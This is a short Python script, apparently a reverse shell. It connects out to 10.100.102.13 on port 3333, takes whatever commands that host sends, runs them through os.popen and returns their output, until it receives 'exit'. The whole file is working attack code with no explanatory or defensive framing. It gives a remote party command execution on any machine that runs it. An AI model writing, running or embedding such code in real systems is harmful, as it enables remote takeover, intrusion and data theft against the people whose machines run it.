from socket import *
import os


client = socket(AF_INET, SOCK_STREAM)
client.connect(("10.100.102.13",3333))

while True:
    data = client.recv(2048).decode()

    if data == "exit":
        client.close()
        break

    result = os.popen(data).read()
    client.sendall(result.encode())
